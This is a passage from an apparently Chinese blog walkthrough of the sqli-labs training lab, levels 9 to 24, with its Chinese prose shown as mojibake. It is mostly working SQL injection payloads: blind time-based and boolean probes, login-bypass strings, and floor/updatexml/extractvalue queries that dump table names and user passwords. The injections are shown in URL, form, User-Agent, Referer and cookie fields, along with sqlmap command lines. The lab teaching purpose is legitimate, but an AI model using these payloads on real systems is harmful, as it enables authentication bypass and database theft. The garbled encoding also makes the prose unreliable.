data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy05Lz9pZD0xJTI3YW5kJTIwaWYoMiUzRTMsc2xlZXAoMyksMSklMjAtLSs=">http://192.168.13.155/sqli/Less-9/?id=1%27and%20if(2%3E3,sleep(3),1)%20--+<i class="fa fa-external-link-alt"></i></span></p>
<p>ç¬¬åå…³ï¼šåŒå¼•å·å­—ç¬¦å‹ï¼Œtime-basedç›²æ³¨<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xMC8/aWQ9MSUyMiUyMGFuZCUyMDE9MSUyMGFuZCUyMHNsZWVwKDMpJTIwLS0r">http://192.168.13.155/sqli/Less-10/?id=1%22%20and%201=1%20and%20sleep(3)%20--+<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xMC8/aWQ9MSUyMiUyMGFuZCUyMDE9MiUyMGFuZCUyMHNsZWVwKDMpJTIwLS0r">http://192.168.13.155/sqli/Less-10/?id=1%22%20and%201=2%20and%20sleep(3)%20--+<i class="fa fa-external-link-alt"></i></span></p>
<p>ç¬¬åä¸€å…³ï¼šå•å¼•å·å­—ç¬¦å‹ï¼ŒPOSTæ³¨å…¥ã€‚<br>1ã€åœ¨ç™»å½•æ¡†è¾“å…¥ç”¨æˆ·åæˆ–å¯†ç â€™orâ€™â€™=â€™,å¯ä»¥ç»•è¿‡éªŒè¯ã€‚<br>2ã€æ³¨å…¥ç‚¹å‡ºç°åœ¨è¡¨å•ï¼Œå¯ä»¥é€šè¿‡sqlmap postå®ç°æ³¨å…¥ï¼Œå› æ­¤éœ€è¦burpsuiteæŠ“åŒ…ï¼Œè·å¾—postæ•°æ®ï¼Œé€šè¿‡sqlmap â€“data å‚æ•°ï¼Œæ³¨å…¥ã€‚<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xMS8mcXVvdDs=">http://192.168.13.155/sqli/Less-11/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“dbs</p>
<p>ç¬¬åäºŒå…³ï¼šåŒå¼•å·å­—ç¬¦å‹ï¼Œpostæ³¨å…¥<br>1ã€åœ¨ç™»å½•æ¡†è¾“å…¥ç”¨æˆ·åæˆ–å¯†ç â€orâ€1â€=â€1ï¼Œå¯ä»¥ç»•è¿‡éªŒè¯ã€‚<br>2ã€æ³¨å…¥ç‚¹å‡ºç°åœ¨è¡¨å•ï¼Œå¯ä»¥é€šè¿‡sqlmap postå®ç°æ³¨å…¥ï¼Œå› æ­¤éœ€è¦burpsuiteæŠ“åŒ…ï¼Œè·å¾—postæ•°æ®uname=admin&amp;passwd=admin&amp;submit=Submitï¼Œé€šè¿‡sqlmap â€“data å‚æ•°ï¼Œæ³¨å…¥ã€‚<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xMi8mcXVvdDs=">http://192.168.13.155/sqli/Less-12/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“dbs</p>
<p>ç¬¬åä¸‰å…³ï¼šå•å¼•å·å­—ç¬¦å‹å˜å½¢ï¼ŒPOSTæ³¨å…¥ï¼ˆåœ¨ç”¨æˆ·åå¤„è¾“å…¥â€™åï¼ŒæŠ¥é”™near â€˜adminâ€™) LIMIT 0,1â€™ at line 1ï¼‰å¯ä»¥è§‚å¯Ÿå‡ºå¼•ç”¨å˜é‡æ—¶å¢åŠ äº†â€™å’Œ)ã€‚<br>1ã€åœ¨ç™»å½•æ¡†è¾“å…¥ç”¨æˆ·åæˆ–å¯†ç  adminâ€™) or (â€˜â€™=â€™ ,å¯ä»¥ç»•è¿‡éªŒè¯ã€‚<br>2ã€æ³¨å…¥ç‚¹å‡ºç°åœ¨è¡¨å•ï¼Œå¯ä»¥é€šè¿‡sqlmap postå®ç°æ³¨å…¥ï¼Œå› æ­¤éœ€è¦burpsuiteæŠ“åŒ…ï¼Œè·å¾—postæ•°æ®uname=admin&amp;passwd=admin&amp;submit=Submitï¼Œé€šè¿‡sqlmap â€“data å‚æ•°ï¼Œæ³¨å…¥ã€‚<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xMy8mcXVvdDs=">http://192.168.13.155/sqli/Less-13/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“dbs</p>
<p>ç¬¬åå››å…³ï¼šåŒå¼•å·å­—ç¬¦å‹ï¼ŒPOSTæ³¨å…¥</p>
<p>1ã€åœ¨ç™»å½•æ¡†è¾“å…¥ç”¨æˆ·åæˆ–å¯†ç  adminâ€ or â€œâ€=â€ ,å¯ä»¥ç»•è¿‡éªŒè¯ã€‚<br>2ã€æ³¨å…¥ç‚¹å‡ºç°åœ¨è¡¨å•ï¼Œå¯ä»¥é€šè¿‡sqlmap postå®ç°æ³¨å…¥ï¼Œå› æ­¤éœ€è¦burpsuiteæŠ“åŒ…ï¼Œè·å¾—postæ•°æ®uname=admin&amp;passwd=admin&amp;submit=Submitï¼Œé€šè¿‡sqlmap â€“data å‚æ•°ï¼Œæ³¨å…¥ã€‚<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xNC8mcXVvdDs=">http://192.168.13.155/sqli/Less-14/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“dbs</p>
<p>ç¬¬åäº”å…³ï¼šå•å¼•å·å­—ç¬¦å‹ï¼ŒPOSTç›²æ³¨ã€‚ä¸ä¹‹å‰ç›¸æ¯”ï¼Œæ­¤å¤„å±è”½äº†é”™è¯¯å›æ˜¾ã€‚<br>æœ¬å…³æ”¯æŒ æ—¶é—´ç›²æ³¨ï¼Œæ”¯æŒå¸ƒå°”é€»è¾‘ç›²æ³¨ã€‚<br>1ã€åœ¨ç™»å½•æ¡†è¾“å…¥ç”¨æˆ·åæˆ–å¯†ç  adminâ€™orâ€™â€™=â€™,å¯ä»¥ç»•è¿‡éªŒè¯ã€‚<br>2ã€adminâ€™ and 1=1 and sleep(3) â€“  åŸºäºæ—¶é—´ç›²æ³¨å¯ä»¥<br>3ã€adminâ€™ and 1=1 â€“      åŸºäºå¸ƒå°”é€»è¾‘ç›²æ³¨<br>4ã€é€šè¿‡sqlmap postå®ç°æ³¨å…¥ï¼Œå› æ­¤éœ€è¦burpsuiteæŠ“åŒ…ï¼Œè·å¾—postæ•°æ®uname=admin&amp;passwd=admin&amp;submit=Submitï¼Œé€šè¿‡sqlmap â€“data å‚æ•°ï¼Œæ³¨å…¥ã€‚<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xNS8mcXVvdDs=">http://192.168.13.155/sqli/Less-15/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“dbs</p>
<p>ç¬¬åå…­å…³ï¼šåŒå¼•å·å­—ç¬¦å‹ï¼ŒPOSTç›²æ³¨ã€‚<br>1ã€æ”¯æŒåŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œåœ¨ç”¨æˆ·åè¾“å…¥adminâ€) AND SLEEP(5) AND (â€œgBIlâ€=â€gBIl<br>å¯†ç è¾“å…¥adminã€‚å¯ä»¥çœ‹åˆ°å»¶è¿Ÿæ‰§è¡Œã€‚<br>2ã€æ”¯æŒå¸ƒå°”é€»è¾‘çš„ç›²æ³¨ï¼Œåœ¨ç”¨æˆ·åè¾“å…¥adminâ€) and 1&gt;2 â€“ å¯†ç å‡ºè¾“å…¥adminï¼Œå½“è¡¨è¾¾å¼æˆç«‹æ—¶ï¼Œæç¤ºç™»å½•æˆåŠŸï¼Œè¡¨è¾¾å¼ä¸æˆç«‹ï¼Œç™»å½•å¤±è´¥ã€‚<br>3ã€é€šè¿‡sqlmap postå®ç°æ³¨å…¥ï¼Œå› æ­¤éœ€è¦burpsuiteæŠ“åŒ…ï¼Œè·å¾—postæ•°æ®uname=admin&amp;passwd=admin&amp;submit=Submitï¼Œé€šè¿‡sqlmap â€“data å‚æ•°ï¼Œæ³¨å…¥ã€‚è¿™é‡Œéœ€è¦è®¾ç½®â€“level 3<br>python sqlmap.py -u â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xNi8mcXVvdDs=">http://192.168.13.155/sqli/Less-16/&quot;<i class="fa fa-external-link-alt"></i></span> â€“data â€œuname=admin&amp;passwd=admin&amp;submit=Submitâ€ -v 3 â€“level 3</p>
<p>ç¬¬åä¸ƒå…³ï¼šæ›´æ–°æ•°æ®åº“ï¼Œå­—ç¬¦å‹æŠ¥é”™æ³¨å…¥ã€‚<br>1ã€ç”¨æˆ·åè¾“å…¥adminï¼Œå¯†ç è¾“å…¥123â€™ï¼ŒæŠ¥é”™near â€˜adminâ€™â€™ at line 1ï¼Œåˆ¤æ–­æ­¤å¤„å­˜åœ¨æ³¨å…¥ï¼Œä¸ºå­—ç¬¦å‹ã€‚<br>2ã€å°è¯•æŠ¥é”™æ³¨å…¥ã€‚ç”¨æˆ·åè¾“å…¥adminï¼Œå¯†ç è¾“å…¥ 123â€™ and (select 1 from (select count(*),floor(rand(0)<em>2)x from  information_schema.schemata group by x)a); â€“<br>é¡µé¢è¿”å›æŠ¥é”™ä¿¡æ¯ã€‚Duplicate entry â€˜1â€™ for key â€˜group_keyâ€™<br>3ã€æ³¨å…¥payloadï¼šåˆ©ç”¨floorå‡½æ•°æŠ¥é”™<br>çˆ†æ•°æ®åº“<br>123â€™ and (select 1 from (select  count(</em>),concat(user(),database(),floor(rand(0)<em>2))x from  information_schema.schemata group by x)a); â€“<br>çˆ†è¡¨å<br>123â€™ and  (select 1 from (select count(</em>),concat((select concat(table_name) from  information_schema.tables where table_schema=database() limit  0,1),0x3a,floor(rand(0)<em>2))x from information_schema.schemata group by  x)a); â€“<br>çˆ†å­—æ®µ<br>123â€™ and (select 1 from (select  count(</em>),concat((select concat(column_name) from  information_schema.columns where table_schema=database() and  table_name=â€™usersâ€™ limit 0,1),0x3a,floor(rand(0)<em>2))x from  information_schema.schemata group by x)a); â€“<br>çˆ†å†…å®¹<br>123â€™ and (select 1 from (select count(</em>),concat((select concat(user,password) from  dvwa.users limit 0,1),0x3a,floor(rand(0)*2))x from  information_schema.schemata group by x)a); â€“ </p>
<p>å…¶ä»–å¯åˆ©ç”¨æŠ¥é”™å‡½æ•°<br>and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<br>and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<br>and (updatexml(1,concat(0x7e,(select (select concat(user,password) from dvwa.users limit 0,1)),0x7e),1));<br>ç”¨æ³¨å…¥payloadä¾‹å¦‚ (select concat(user,password) from dvwa.users limit 0,1) ä»£æ›¿user()å‡½æ•°å³å¯ã€‚</p>
<p>ç¬¬åå…«å…³ï¼šå­—ç¬¦å‹httpå¤´User-Agentæ³¨å…¥<br>æœ¬å¤„èƒ½å¤Ÿçœ‹åˆ°é¡µé¢å›æ˜¾ç”¨æˆ·çš„ipå’Œuser-agentä¿¡æ¯ï¼Œé€šè¿‡burpæŠŠç™»å½•è¿‡ç¨‹æŠ“åŒ…ï¼Œå¹¶åœ¨user-agentåé¢å¢åŠ â€™ï¼ˆUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0)Gecko/20100101  Firefox/66.0â€™ï¼‰,é¡µé¢æŠ¥é”™ï¼šYou have an error in your SQL syntax; check the  manual that corresponds to your MariaDB server version for the right  syntax to use near â€˜192.168.13.1â€™, â€˜adminâ€™)â€™ at line 1<br>ç”±æ­¤åˆ¤æ–­æ­¤å¤„å­˜åœ¨user-agentä¿¡æ¯è¢«å†™å…¥åˆ°æ•°æ®åº“ï¼Œå› æ­¤æ„é€ åŸºäºæŠ¥é”™çš„æ³¨å…¥ã€‚<br>åˆ©ç”¨extractvalue()å’Œupdatexml()å‡½æ•°å¯ä»¥å®ç°æ³¨å…¥ã€‚<br>çˆ†åº“<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0)Gecko/20100101  Firefox/66.0â€™ and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and â€˜â€™=â€™<br>çˆ†è¡¨<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0)Gecko/20100101 Firefox/66.0â€™and  (updatexml(1,concat(0x7e,(select (select concat(table_name) from  information_schema.tables where table_schema=database() limit  0,1)),0x7e),1)) and â€˜â€™=â€™<br>çˆ†åˆ—<br>User-Agent: Mozilla/5.0 (Windows NT  10.0; Win64; x64; rv:66.0)Gecko/20100101 Firefox/66.0â€™and  (updatexml(1,concat(0x7e,(select (select concat(column_name) from  information_schema.columns where table_schema=database() and  table_name=â€™usersâ€™ limit 0,1)),0x7e),1)) and â€˜â€™=â€™<br>çˆ†å†…å®¹<br>User-Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0)Gecko/20100101  Firefox/66.0â€™and (updatexml(1,concat(0x7e,(select (select  concat(user,password) from dvwa.users limit 0,1)),0x7e),1)) and â€˜â€™=â€™</p>
<p>åˆ©ç”¨sqlmapåœ¨-level 3çº§åˆ«ï¼Œä¼šå°è¯•httpå¤´æ³¨å…¥<br>åˆ©ç”¨sqlmapå¯ä»¥åˆ©ç”¨â€“user-agentå‚æ•°å°è¯•æ³¨å…¥ã€‚<br>å»ºè®®åœ¨burpä¸­å°†httpè¯·æ±‚ copy to fileï¼Œä¿å­˜æ–‡ä»¶ä¾‹å¦‚req.txtï¼ˆæŠ“åŒ…éœ€è¦è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼‰<br>python sqlmap.py -r d:\req.txt â€“user-agent Mozilla/5.0 (Windows NT 10.0;  Win64; x64; rv:66.0)Gecko/20100101 Firefox/66.0 â€“level 3</p>
<p>ç¬¬åä¹å…³ï¼šå­—ç¬¦å‹httpå¤´refereræ³¨å…¥<br>åœ¨æœ¬å…³è¾“å…¥æ­£ç¡®ç”¨æˆ·æ°‘å’Œå¯†ç ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢æ˜¾ç¤ºrefererä¿¡æ¯ã€‚<br>é€šè¿‡burpæŠŠç™»å½•è¿‡ç¨‹æŠ“åŒ…ï¼Œå¹¶åœ¨refereråé¢å¢åŠ â€™ï¼ˆReferer: <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xOS8mIzM5OyVFRiVCQyU4OSwlRTklQTElQjUlRTklOUQlQTIlRTYlOEElQTUlRTklOTQlOTklRUYlQkMlOUFZb3U=">http://192.168.13.155/sqli/Less-19/&#39;ï¼‰,é¡µé¢æŠ¥é”™ï¼šYou<i class="fa fa-external-link-alt"></i></span> have an error in your  SQL syntax; check the manual that corresponds to your MariaDB server  version for the right syntax to use near â€˜192.168.13.1â€™)â€™ at line 1<br>ç”±æ­¤åˆ¤æ–­æ­¤å¤„å­˜åœ¨refererä¿¡æ¯è¢«å†™å…¥åˆ°æ•°æ®åº“ï¼Œå› æ­¤æ„é€ åŸºäºæŠ¥é”™çš„æ³¨å…¥ã€‚<br>çˆ†åº“<br>Referer: <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xOS8mIzM5Ow==">http://192.168.13.155/sqli/Less-19/&#39;<i class="fa fa-external-link-alt"></i></span> and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and â€˜â€™=â€™<br>çˆ†è¡¨<br>Referer: <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xOS8mIzM5O2FuZA==">http://192.168.13.155/sqli/Less-19/&#39;and<i class="fa fa-external-link-alt"></i></span>  (updatexml(1,concat(0x7e,(select (select concat(table_name) from  information_schema.tables where table_schema=database() limit  0,1)),0x7e),1)) and â€˜â€™=â€™<br>çˆ†åˆ—<br>Referer:  <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xOS8mIzM5O2FuZA==">http://192.168.13.155/sqli/Less-19/&#39;and<i class="fa fa-external-link-alt"></i></span> (updatexml(1,concat(0x7e,(select (select concat(column_name) from information_schema.columns where  table_schema=database() and table_name=â€™usersâ€™ limit 0,1)),0x7e),1)) and â€˜â€™=â€™<br>çˆ†å†…å®¹<br>Referer: <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xOS8mIzM5O2FuZA==">http://192.168.13.155/sqli/Less-19/&#39;and<i class="fa fa-external-link-alt"></i></span>  (updatexml(1,concat(0x7e,(select (select concat(user,password) from  dvwa.users limit 0,1)),0x7e),1)) and â€˜â€™=â€™</p>
<p>åˆ©ç”¨sqlmapåœ¨-level 3çº§åˆ«ï¼Œä¼šå°è¯•httpå¤´æ³¨å…¥<br>åˆ©ç”¨sqlmapå¯ä»¥åˆ©ç”¨â€“refererå‚æ•°å°è¯•æ³¨å…¥ã€‚<br>å»ºè®®åœ¨burpä¸­å°†httpè¯·æ±‚ copy to fileï¼Œä¿å­˜æ–‡ä»¶ä¾‹å¦‚req.txtï¼ˆæŠ“åŒ…éœ€è¦è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼‰<br>python sqlmap.py -r d:\refer.txt â€“referer â€œ<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0xOS8mcXVvdDs=">http://192.168.13.155/sqli/Less-19/&quot;<i class="fa fa-external-link-alt"></i></span> â€“level 3</p>
<p>ç¬¬äºŒåå…³ï¼šå­—ç¬¦å‹httpå¤´cookieæ³¨å…¥<br>åœ¨æœ¬å…³è¾“å…¥æ­£ç¡®ç”¨æˆ·åå’Œå¯†ç ï¼Œåœ¨åç»­ä¼šè¯ä¸­å¯ä»¥çœ‹åˆ°cookieä¿¡æ¯ uname=adminã€‚<br>é€šè¿‡burpæŠŠåç»­è¯·æ±‚å¯¼å…¥åˆ°repeateræ¨¡å—ï¼Œä¿®æ”¹cooke ä¸º adminâ€™,é¡µé¢æŠ¥é”™ï¼šIssue with your mysql: You have an error in your SQL  syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near â€˜â€™adminâ€™â€™ LIMIT 0,1â€™ at line<br>ç”±æ­¤åˆ¤æ–­æ­¤å¤„å­˜åœ¨cookieæ³¨å…¥ï¼Œæ„é€ æŠ¥é”™æ³¨å…¥<br>çˆ†åº“<br>cookie: adminâ€™ and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) and â€˜â€™=â€™<br>çˆ†è¡¨<br>cookie: adminâ€™and (updatexml(1,concat(0x7e,(select (select concat(table_name)  from information_schema.tables where table_schema=database() limit  0,1)),0x7e),1)) and â€˜â€™=â€™<br>çˆ†åˆ—<br>cookie: adminâ€™and  (updatexml(1,concat(0x7e,(select (select concat(column_name) from  information_schema.columns where table_schema=database() and  table_name=â€™usersâ€™ limit 0,1)),0x7e),1)) and â€˜â€™=â€™<br>çˆ†å†…å®¹<br>cookie: adminâ€™and (updatexml(1,concat(0x7e,(select (select concat(user,password) from dvwa.users limit 0,1)),0x7e),1)) and â€˜â€™=â€™</p>
<p>åˆ©ç”¨sqlmapåœ¨-level 3çº§åˆ«ï¼Œä¼šå°è¯•httpå¤´æ³¨å…¥<br>åˆ©ç”¨sqlmapå¯ä»¥åˆ©ç”¨â€“cookieå‚æ•°å°è¯•æ³¨å…¥ã€‚<br>å»ºè®®åœ¨burpä¸­å°†httpè¯·æ±‚ copy to fileï¼Œä¿å­˜æ–‡ä»¶ä¾‹å¦‚cookie.txtï¼ˆæŠ“åŒ…éœ€è¦è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼‰<br>python sqlmap.py -r d:\cookie.txt â€“cookie â€œuname=admin; eyP_sid=dGHwDz; PHPSESSID=rveb2uvab9vavmas2e6hsv1tt6â€ â€“level 3</p>
<p>ç¬¬äºŒåä¸€å…³ï¼šåŸºäºcookieçš„base64ç¼–ç æ³¨å…¥ï¼ˆå•å¼•å·ï¼‰<br>è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯ä»¥ä»é¡µé¢è¿”å›çœ‹å‡ºcookieè¢«base64ç¼–ç ï¼Œå› æ­¤å°è¯•cookieæ³¨å…¥æ—¶ï¼Œéœ€è¦å°†æ³¨å…¥å‚æ•°ç¼–ç ä¸ºbase64ï¼Œè¿™é‡Œéœ€è¦å€ŸåŠ©-tamperå‚æ•°è°ƒç”¨base64encode.pyå®ç°ã€‚<br>python sqlmap.py -r d:\21 â€“cookie â€œuname=YWRtaW4%3D; eyP_sid=dGHwDz;  PHPSESSID=rveb2uvab9vavmas2e6hsv1tt6â€ â€“level 3 â€“tamper base64encode.py â€“batch</p>
<p>ç¬¬äºŒåäºŒå…³ï¼šåŸºäºcookieçš„base64ç¼–ç æ³¨å…¥ï¼ˆåŒå¼•å·ï¼‰<br>è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¯ä»¥ä»é¡µé¢è¿”å›çœ‹å‡ºcookieè¢«base64ç¼–ç ï¼Œå› æ­¤å°è¯•cookieæ³¨å…¥æ—¶ï¼Œéœ€è¦å°†æ³¨å…¥å‚æ•°ç¼–ç ä¸ºbase64ï¼Œè¿™é‡Œéœ€è¦å€ŸåŠ©-tamperå‚æ•°è°ƒç”¨base64encode.pyå®ç°ã€‚<br>python sqlmap.py -r d:\22 â€“cookie â€œuname=YWRtaW4%3D; eyP_sid=dGHwDz;  PHPSESSID=rveb2uvab9vavmas2e6hsv1tt6â€ â€“level 3 â€“tamper base64encode.py â€“batch</p>
<p>ç¬¬äºŒåä¸‰å…³ï¼šå•å¼•å·å­—ç¬¦å‹ç›²æ³¨ï¼Œè¿‡æ»¤äº†æ³¨é‡Šç¬¦å·ã€‚<br>æ³¨é‡Šç¬¦å·è¢«è¿‡æ»¤ï¼Œå› æ¬¡åœ¨æ³¨å…¥å¼éœ€è¦æ„é€ é—­åˆå•å¼•å·çš„è¯­å¥ã€‚<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yMy8/aWQ9MyYjMzk7">http://192.168.13.155/sqli/Less-23/?id=3&#39;<i class="fa fa-external-link-alt"></i></span> and 2&gt;1 and â€˜1â€™=â€™1<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTMuMTU1L3NxbGkvTGVzcy0yMy8/aWQ9MyYjMzk7">http://192.168.13.155/sqli/Less-23/?id=3&#39;<i class="fa fa-external-link-alt"></i></span> and 2&gt;1 and â€˜1â€™=â€™2<br>æ³¨å…¥å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ä»£æ›¿2&gt;1çš„è¡¨è¾¾å¼ã€‚<br>1è·å¾—æ•°æ®åº“å<br>And Length(database())&gt;n //åˆ¤æ–­å½“å‰æ•°æ®åº“é•¿åº¦<br>And Ascii(Substr(database(),m,1))&gt;n //æˆªå–æ•°æ®åº“åç¬¬mä¸ªå­—ç¬¦å¹¶è½¬æ¢ä¸ºasciiç <br>2ã€åˆ¤æ–­æ•°æ®åº“çš„è¡¨é•¿åº¦ä¸è¡¨å<br>And Length((Select table_name from information_schema.tables where table_schema=â€™dvwaâ€™ limit 0,1))&gt;n //åˆ¤æ–­ç¬¬ä¸€è¡Œè¡¨åçš„é•¿åº¦<br>And Ascii(substr((Select table_name from information_schema.tables where  table_schema=â€™dvwaâ€™ limit 0,1),m,1))&gt;n //æˆªå–ç¬¬ä¸€è¡Œè¡¨åçš„ç¬¬mä¸ªå­—ç¬¦ä¸²å¹¶è½¬æ¢ä¸ºasciiç ã€‚<br>3ã€åˆ¤æ–­æ•°æ®åº“çš„å­—æ®µåé•¿åº¦ä¸å­—æ®µåç§°<br>And Length((Select column_name from information_schema.columns where table_name=â€™usersâ€™ limit 0,1))&gt;n //åˆ¤æ–­è¡¨ä¸­å­—æ®µåçš„é•¿åº¦<br>And Ascii(substr((Select column_name from information_schema.columns where  table_name=â€™usersâ€™ limit 0,1),m,1))&gt;n //æˆªå–è¡¨ä¸­å­—æ®µçš„ç¬¬må­—ç¬¦ä¸²å¹¶è½¬æ¢ä¸ºasciiç <br>4ã€åˆ¤æ–­å­—æ®µçš„å†…å®¹é•¿åº¦ä¸å†…å®¹å­—ç¬¦ä¸²<br>And length((select user from users limit 0,1))&gt;1 //åˆ¤æ–­å­—ç¬¦ä¸²å†…å®¹é•¿åº¦<br>And Ascii(substr((select user from users limit 0,1),m,1)) //æˆªå–ç¬¬mä¸ªå­—ç¬¦ä¸²å¹¶è½¬æ¢ä¸ºasciiç </p>
<p>ç¬¬äºŒåå››å…³ï¼šäºŒé˜¶æ³¨å…¥<br>äºŒé˜¶æ³¨å…¥åŸç†ï¼š<br>\1. é»‘å®¢é€šè¿‡æ„é€ æ•°æ®çš„å½¢å¼ï¼Œåœ¨æµè§ˆå™¨æˆ–è€…å…¶ä»–è½¯ä»¶ä¸­æäº¤HTTPæ•°æ®æŠ¥æ–‡è¯·æ±‚åˆ°æœåŠ¡ç«¯è¿›è¡Œå¤„ç†ï¼Œæäº¤çš„æ•°æ®æŠ¥æ–‡è¯·æ±‚ä¸­å¯èƒ½åŒ…å«äº†é»‘å®¢æ„é€ çš„SQLè¯­å¥æˆ–è€…å‘½ä»¤ã€‚<br>\2. æœåŠ¡ç«¯åº”ç”¨ç¨‹åºä¼šå°†é»‘å®¢æäº¤çš„æ•°æ®ä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼Œé€šå¸¸æ˜¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œä¿å­˜çš„æ•°æ®ä¿¡æ¯çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œå…¶ä»–åŠŸèƒ½æä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚åšå‡ºå“åº”ã€‚<br>\3. é»‘å®¢å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯ã€‚<br>\4. æœåŠ¡ç«¯æ¥æ”¶åˆ°é»‘å®¢æäº¤çš„ç¬¬äºŒä¸ªè¯·æ±‚ä¿¡æ¯åï¼Œä¸ºäº†å¤„ç†è¯¥è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¼šæŸ¥è¯¢æ•°æ®åº“ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´é»‘å®¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„SQLè¯­å¥æˆ–è€…å‘½ä»¤åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œã€‚<br>\5. æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœæ•°æ®ä¿¡æ¯åˆ¤æ–­äºŒæ¬¡æ³¨å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸã€‚<br>äºŒæ¬¡æ³¨å…¥åŸç†æ¡ˆåˆ—è¯¦è§£ï¼š<br>å‡å¦‚æœ‰ä¸€ä¸ªç½‘ç«™ç®¡ç†å‘˜çš„ç”¨æˆ·åä¸ºï¼šroot  å¯†ç ä¸ºï¼š123456789 ï¼Œæ”»å‡»è€…æ³¨å†Œäº†ä¸€ä¸ªè´¦å· ï¼š rootâ€™â€“  å¯†ç ä¸ºï¼š123<br>å› ä¸ºè´¦å·å½“ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œç½‘ç«™å¯¹äºç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œä¸€æ¬¡æ³¨å…¥åœ¨è¿™å°±è¡Œä¸é€šäº†ã€‚è™½ç„¶è´¦å·è¢«è½¬ä¹‰äº†ï¼Œä½†æ˜¯ä»–åœ¨æ•°æ®åº“å½“ä¸­<br>ä»»ç„¶æ˜¯ä»¥ rootâ€™â€“  çš„æ–¹å¼è¢«å‚¨å­˜çš„ã€‚<br> ç°åœ¨æ”»å‡»è€…å¼€å§‹å®æ–½æ­£çœŸçš„æ”»å‡»äº†ï¼Œä»–å¼€å§‹å¯¹è´¦å·ä¿®æ”¹å¯†ç ã€‚æ™®é€šç½‘ç«™ä¿®æ”¹å¯†ç çš„è¿‡ç¨‹ä¸ºï¼šå…ˆåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨â€”â€”ã€‹ç¡®<br>è®¤ç”¨æˆ·ä»¥å‰çš„å¯†ç 